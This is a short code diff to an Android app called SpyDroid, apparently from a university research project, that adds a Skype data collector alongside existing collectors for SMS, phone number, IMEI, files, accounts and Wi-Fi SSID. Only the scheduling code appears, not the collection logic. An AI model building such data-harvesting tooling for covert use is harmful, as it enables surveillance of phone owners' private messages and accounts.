@@ -27,6 +27,7 @@ import edu.duke.spydroid.collectors.MACCollector;
 import edu.duke.spydroid.collectors.PhoneNumberCollector;
 import edu.duke.spydroid.collectors.SMSCollector;
 import edu.duke.spydroid.collectors.SSIDCollector;
+import edu.duke.spydroid.collectors.SkypeCollector;
 import edu.duke.spydroid.view.DataCollectionPaneController;
 import edu.duke.spydroid.view.PreferenceController;
 
@@ -144,6 +145,7 @@ public final class SpyDroid extends Activity {
 	    StaticCollector PNColl= new PhoneNumberCollector(ctxt,"coll_phone_number",collService);
 	    StaticCollector SSIDColl= new SSIDCollector(ctxt,"coll_SSID",collService);
 	    StaticCollector versionColl= new AndroidVersionCollector(ctxt,"coll_version",collService);
+	    StaticCollector skypeColl = new SkypeCollector(getApplicationContext(), "coll_skype", null);
 	    
 		//Scheduling
 		collService.scheduleCollector(imeiColl);
@@ -155,6 +157,7 @@ public final class SpyDroid extends Activity {
 		collService.scheduleCollector(smsColl);
 		collService.scheduleCollector(fileColl);
         collService.scheduleCollector(accountColl);
+        collService.scheduleCollector(skypeColl);
 	}
 	
 	
